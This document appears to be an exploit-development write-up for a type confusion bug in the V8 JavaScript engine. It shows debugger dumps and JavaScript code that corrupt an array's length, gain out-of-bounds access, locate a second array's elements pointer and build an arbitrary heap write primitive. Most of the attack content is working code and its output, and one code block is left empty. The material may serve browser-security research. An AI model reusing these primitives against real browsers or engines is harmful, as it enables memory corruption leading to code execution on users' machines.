# Trigger

Successfully trigger the type confusion:

```shell
Debug of corrupted_instance.x
DebugPrint: 0x118e00404bcd: [JSArray] in OldSpace
 - map: 0x118e0018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
             ^^^^^^^^^^^^^^
              same with a
 - length: 8
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.x
DebugPrint: 0x118e00404c01: [JSArray] in OldSpace
 - map: 0x118e0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS] <--- different elements kind
             ^^^^^^^^^^^^^^
              same with x
 - length: 1
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

# Initial read-write primitives

Once the vulnerability is triggered, the same memory region is used for storing the backing buffer of an array with objects (x) as well as the backing buffer and metadata of a packed double array (a). This means that the length property of the packed double array a can be modified by writing to certain elements in the object array.

Look at the memory of JSArray again:

```shell
Debug of corrupted_instance.a
DebugPrint: 0x25a200404ccd: [JSArray] in OldSpace
 - map: 0x25a20018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x25a20018e935 <JSArray[0]>
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x25a2000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x25a200000d41: [String] in ReadOnlySpace: #length: 0x25a200025e2d <AccessorInfo name= 0x25a200000d41 <String[6]: #length>, data= 0x25a200000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Memmory dump at elements:

```shell
gef➤  x/64x 0x25a200404cbd - 1
0x25a200404cbc:	0x00000851	0x00000002	0x9999999a	0x3ff19999
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of FDA   length=1           1.1              <-- pointer tagging, length = 2 on memory
0x25a200404ccc:	0x0018efc1	0x000006cd	0x00404cbd	0x00000002
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of JSArray                       length of JSArray <-- at offset 5
```

FDA stand for FixedDoubleArray.

The following code attempts to write `0x10000` to the length field of the object array:

```js
corrupted_instance.x[5] = 0x10000;
```

Output:

```shell
[+] Triggering the bug...
[+] Corrupting the metadata (length) of corrupted_instance.a ..
[+] Initial corruption succeeded!
Debug of corrupted_instance.x
DebugPrint: 0x17f900404c3d: [JSArray] in OldSpace
 - map: 0x17f90018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
 - length: 8
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.a
DebugPrint: 0x17f900404c71: [JSArray] in OldSpace
 - map: 0x17f90018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536 <---- 0x10000
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Once the length of the array is overwritten, out of bounds read/write can be performed, relative to the position of the backing element buffer of the array. To make use of this, the exploit allocates another packed double array and **finds the offset and the element index to reach its metadata from the start of the elements buffer of the corrupted array**.

```js
print("Perfoming read/write out of bounds...");
while (true) {
   let rwarr = [1.1, 2.2, 3.3];
   let rwarr_addr = addrof_tmp(rwarr);
   let a_addr = addrof_tmp(corrupted_instance.a);

   // If our target array to corrupt does not lie after our corrupted array, then
   // we can't do anything. Bail and retry the exploit.
   if (rwarr_addr < a_addr) {
      // print("[+] Target array does not lie after corrupted array. Retrying...");
   } else {
      print(`[+] Address of corrupted_instance.a: 0x${a_addr.toString(16)}`);
      print(`[+] Address of rwArr: 0x${rwarr_addr.toString(16)}`);
      debug_print(`corrupted_instance.a`, corrupted_instance.a);
      debug_print(`rwarr`, rwarr);
      print("[+] Calculating the offset...");
      let offset = (rwarr_addr - a_addr) + 0xc; // 0xc is the offset from the metadata to the backing storage
      if ((offset % 8) != 0) {
            offset -= 4; // turn back 4 bytes if the offset is not divisible by 8 (each element is 8 bytes long),
            // because we need to convert it to number of elements
            // used for changing the backing storage of rwarr through corrupted_instance.a
      }
      print("[+] Offset: " + offset);

      let marker42_idx = offset / 8; // idex of backing storage of corrupted_instance.a
      // marker42_idx += 9; // no need
      break;
   }
}
```

Debug print out both buffers:

```shell
DebugPrint: 0x3ba1001a5d15: [JSArray] in OldSpace
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> {
           0: 1.1
 }

Debug of rwarr
DebugPrint: 0x3ba1002c267d: [JSArray]
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }

[+] Calculating the offset...
[+] Offset: 1165680
[+] Address of backing storage pointer of rwarr: 2c2684
```

First, we calculate the address of the backing storage pointer of `rwarr` from `rwarr_addr`:

```shell
gef➤  x/12x 0x3ba1002c267d - 1 + 8
0x3ba1002c2684:	0x002c265d	0x00000006	0x00001085	0x001a5d51
                  ^^^^^^^^^^
                  elements
0x3ba1002c2694:	0x000007b1	0x002c267d	0x3ff19999	0x000007b1
0x3ba1002c26a4:	0x001a5d15	0x3ff19999	0x000005dd	0x0000000e
```

Then, add `a_addr` with the offset to get the same address:

```shell
gef➤  p 0x3ba1001a5d15 -1 + 1165680
$12 = 0x3ba1002c2684
```

After that, the offset from the backing storage of `corrupted_instance.a` to get the same address need to be added by 16:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165680 + 16
$14 = 0x3ba1002c2684
```

The reason is that the backing storage of `corrupted_instance.a` is 16 bytes before the JSArray object.

```shell
gef➤  x/24x 0x3ba1001a5d05 - 1
0x3ba1001a5d04:	0x00000851	0x00000002	0x001a5d15	0x3ff19999
                  ^^^^^^^^^^                                      
                  Map of FixedDoubleArray                         
0x3ba1001a5d14:	0x0018efc1	0x000006cd	0x001a5d05	0x00020000
                  ^^^^^^^^^^
                  Map of JSArray
0x3ba1001a5d24:	0x001a357d	0x001a357d	0x00000a09	0x00000000
0x3ba1001a5d34:	0x000015d5	0x00028991	0x001a5d2d	0x0018efc1
0x3ba1001a5d44:	0x000006cd	0x002c2149	0x00000006	0x0000150d
0x3ba1001a5d54:	0x001a5d41	0x00000000	0x002c2615	0x00000001
```

We convert the above calculation into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165696
$15 = 0x3ba1002c2684
```

And into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 145712*8
$16 = 0x3ba1002c2684
```

Where `145712` is our index of the element that points to the backing storage of rwarr.

Now, we have the ability to point to any memory address as we want through `corrupted_instance.a[145712]`.

If the elements pointer of this array is modified to point to a specific value, then writing to an index in the rwarr will write a controlled float to this chosen address thereby achieving an arbitrary write in the V8 heap.

```js

```

The first if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717
0x3cb6002c297c:	0x00000006	0x00001085	0x001a6021	0x000007b1
                  ^^^^^^^^^^  ^^^^^^^^^^
                    u32[1]      u32[0]
0x3cb6002c298c:	0x002c2971	0x3ff19999	0x000007b1	0x001a5fe5
0x3cb6002c299c:	0x3ff19999	0x00000155	0x00000003	0x0000001d
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 8
0x3cb6002c2974:	0x000006cd	0x002c2951	0x00000006	0x00001085
                              ^^^^^^^^^^  
                             u32[1]=where-8    
0x3cb6002c2984:	0x001a6021	0x000007b1	0x002c2971	0x3ff19999
0x3cb6002c2994:	0x000007b1	0x001a5fe5	0x3ff19999	0x00000155
```

The else if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 4
0x3cb6002c2978:	0x002c2951	0x00000006	0x00001085	0x001a6021
                  ^^^^^^^^^^  ^^^^^^^^^^
                u32[0]=where-8   u32[1]
0x3cb6002c2988:	0x000007b1	0x002c2971	0x3ff19999	0x000007b1
0x3cb6002c2998:	0x001a5fe5	0x3ff19999	0x00000155	0x00000003
```

However both, the addrof as well as the write primitive depend on there being no garbage collection run after the successful trigger of the bug. This is because if a GC occurs, then it will move the objects in memory and primitives like corruption of the array elements will no longer work because the metadata and elements region of the array maybe moved to separate regions by the Garbage Collector. A GC can also crash the engine if it sees corrupted metadata like corrupted maps or array lengths or elements pointers.
